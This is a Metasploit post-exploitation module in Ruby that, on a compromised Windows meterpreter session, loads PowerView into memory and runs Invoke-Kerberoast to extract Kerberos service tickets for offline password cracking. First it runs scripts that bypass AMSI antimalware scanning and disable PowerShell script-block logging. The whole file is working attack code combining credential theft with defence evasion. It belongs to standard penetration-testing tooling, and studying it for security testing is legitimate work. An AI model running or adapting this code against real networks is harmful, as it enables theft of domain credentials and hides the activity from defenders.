##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Powershell
  include Msf::Post::Windows::Priv
  include Msf::Post::Common

  def initialize(info = {})
    super(update_info(
      info,
      'Name' => 'Kerberoast',
      'Description' => %q(This module load in memory PowerView.ps1 and executes Invoke-Kerberoast.),
      'License' => MSF_LICENSE,
      'Author' => [
        'harmj0y', # Invoke-Kerberoast
        'phra' # MSF Module
      ],
      'References' => [''],
      'Platform' => [ 'win' ],
      'Arch' => [ 'x86', 'x64' ],
      'SessionTypes' => [ 'meterpreter' ]
    )
  )

    register_options(
      [
        OptString.new('CMD', [ true, 'Example: Invoke-Kerberoast | fl', 'Get-Help Invoke-Kerberoast' ])
      ],
      self.class
    )
  end

  def run
    if have_powershell?
      print_good('PowerShell is installed.')
    else
      print_error('PowerShell is not installed! STOPPING')
      return
    end

    bypass_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "Invoke-Bypass.ps1"))
    bypass_script += "\r\nInvoke-BypassAMSI;Invoke-BypassScriptBlockLog;\r\n"
    base_script = File.read(File.join(Msf::Config.data_directory, "post", "powershell", "PowerView.ps1"))
    print_status("Executing: #{datastore['cmd']}")
    ps_output = psh_exec("#{bypass_script}\r\n#{base_script}\r\n#{datastore['cmd']}")
    print_good("Powershell Script executed")
    print_good("#{ps_output}")
  end
end
